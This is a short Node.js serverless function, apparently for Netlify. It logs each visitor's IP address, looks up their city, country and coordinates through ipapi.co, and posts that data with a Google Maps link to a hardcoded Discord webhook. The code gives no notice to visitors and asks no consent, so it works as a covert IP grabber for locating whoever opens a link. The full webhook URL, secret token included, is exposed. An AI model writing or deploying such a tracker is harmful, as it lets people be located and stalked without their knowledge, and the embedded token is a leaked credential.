const fetch = require('node-fetch');

exports.handler = async (event, context) => {
  const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";

  // Extract IP address
  const ip =
    event.headers['x-nf-client-connection-ip'] ||
    event.headers['client-ip'] ||
    event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    'Unknown IP';

  const timestamp = new Date().toISOString();

  try {
    // Get location info using ipapi.co
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
    const geoData = await geoRes.json();

    const {
      city = "Unknown City",
      region = "Unknown Region",
      country_name = "Unknown Country",
      latitude,
      longitude
    } = geoData;

    const googleMapsLink = (latitude && longitude)
      ? `https://www.google.com/maps?q=${latitude},${longitude}`
      : "No coordinates available";

    const message = {
      content: `**IP:** ${ip}
**Location:** ${city}, ${region}, ${country_name}
**Time:** ${timestamp}
**Map:** ${googleMapsLink}`
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    return {
      statusCode: 200,
      body: 'IP & location sent successfully!',
    };
  } catch (error) {
    console.error('Error fetching or sending data:', error);
    return {
      statusCode: 500,
      body: 'Something went wrong.',
    };
  }
};
